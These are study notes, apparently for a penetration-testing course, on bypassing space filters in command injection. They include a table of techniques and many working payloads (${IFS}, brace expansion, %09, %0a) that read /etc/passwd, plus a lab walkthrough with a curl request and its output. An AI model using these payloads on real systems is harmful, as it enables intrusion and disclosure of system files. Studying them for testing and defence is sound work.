# Section 6 — Bypassing Space Filters

---

## Why Spaces Get Filtered

Inputs that should contain no whitespace (IP, hostname, filename, slug) are easy targets for a space denylist. Block ` ` and you've stopped most casual `; cat /etc/passwd` payloads.

But spaces are also the easiest character to substitute — bash accepts many alternatives.

---

## Space Substitution Techniques

| Method | Payload | Notes |
|--------|---------|-------|
| Tab | `%09` | Works on Linux + Windows |
| `${IFS}` | `${IFS}` | Bash's Internal Field Separator — defaults to space/tab/newline |
| Brace expansion | `{ls,-la}` | Bash inserts spaces between comma-separated tokens |
| `<` redirect | `cat</etc/passwd` | Replaces space in file ops |
| Newline | `%0a` | Sometimes works mid-command if not blocked |
| `$IFS$9` | `$IFS$9` | `$9` is empty (no 9th arg) — appended to force IFS parsing |
| Subshell var | `cat$u/etc/passwd` | `$u` undefined = empty string, separates tokens |

> Test each — bypass behavior varies by filter implementation.

---

## `${IFS}` — The Universal Space Replacement

Bash's `$IFS` (Internal Field Separator) is space-tab-newline by default. When the shell expands `${IFS}` it produces the equivalent of a space:

```bash
ls${IFS}-la
# equivalent to:
ls -la
```

Combined with newline (`%0a`) injection:
```
?ip=127.0.0.1%0a${IFS}whoami
?ip=127.0.0.1%0als${IFS}-la
?ip=127.0.0.1%0acat${IFS}/etc/passwd
```

---

## Brace Expansion — `{cmd,arg1,arg2}`

Bash automatically inserts spaces between comma-separated tokens inside braces:

```bash
{ls,-la}              →  ls -la
{cat,/etc/passwd}     →  cat /etc/passwd
{echo,hello,world}    →  echo hello world
```

URL-friendly because no spaces are ever transmitted:
```
?ip=127.0.0.1%0a{ls,-la}
?ip=127.0.0.1%0a{cat,/etc/passwd}
```

---

## Tab Character (`%09`)

Tabs work just like spaces as argument separators in shell:
```
?ip=127.0.0.1%0als%09-la
```

Often missed by filters because:
- Denylist regex like `[ ]+` only matches space, not tab
- Code that does `str_replace(' ', '', ...)` is space-specific

---

## Input Redirection (for file commands)

```bash
cat</etc/passwd                    # no space, file redirected into cat
echo "test">/tmp/x                 # no space before /tmp/x
ls<<<""                            # null heredoc — empty arg
```

Limited utility — only works for commands that read from stdin or accept redirection.

---

## Variables with Empty Values

```bash
cat$u/etc/passwd
# $u is undefined → expands to empty string
# Shell sees: cat /etc/passwd (the $u acts as token separator)
```

Or use builtin vars known to be empty:
```bash
$9   # the ninth positional argument (usually empty)
$@   # all positional args (usually empty in non-script context)
```

---

## Combining With Newline Injection

When `;` and space are both blocked, the canonical pattern is `%0a` + `${IFS}`:

```bash
?ip=127.0.0.1%0a${IFS}whoami
?ip=127.0.0.1%0acat${IFS}/etc/passwd
?ip=127.0.0.1%0a{cat,/etc/passwd}
```

URL-encoded newline starts a new command on a new shell line; `${IFS}` or brace expansion supplies the space between command and arguments.

---

## Lab — Find index.php Size

**Target:** `154.57.164.73:30363`

Spaces blacklisted alongside `&` and `|`. Newline (`%0a`) passes. Need `ls -la` with no literal space.

```bash
curl -sk -X POST "http://154.57.164.73:30363/" \
  --data-urlencode 'ip=127.0.0.1
${IFS}ls${IFS}-la'
```

(The newline in `--data-urlencode` becomes `%0A` on the wire.)

Output:
```
PING 127.0.0.1 ...
1 packets transmitted, 1 received, 0% packet loss
total 8
drwxr-xr-x. 1 www-data www-data   40 Jul 16  2021 .
drwxr-xr-x. 1 www-data www-data   18 Aug 19  2020 ..
-rw-r--r--. 1 www-data www-data 1613 Jul 16  2021 index.php
-rw-r--r--. 1 www-data www-data 1256 Jul 12  2021 style.css
```

**Q1 Answer:** `1613` (size of `index.php`)

Equivalent payloads:
```bash
# Tab substitution
ip=127.0.0.1%0als%09-la

# Brace expansion
ip=127.0.0.1%0a{ls,-la}
```

---

## Exam Notes

- `${IFS}` is the canonical space bypass — memorize it
- Brace expansion `{cmd,arg}` is the most elegant when you control the full command structure
- Tab `%09` is the cheapest URL-level bypass when you can't change the URL encoding
- Combine with newline: `%0a${IFS}` is the most reliable bypass pair when both `;` and space are blocked
- For Windows PowerShell injection (rare in HTB): `${env:IFS}` doesn't work — use `cmd|whoami` patterns instead
- When pattern-matching filters block these, escalate to character/keyword obfuscation (Section 7+)
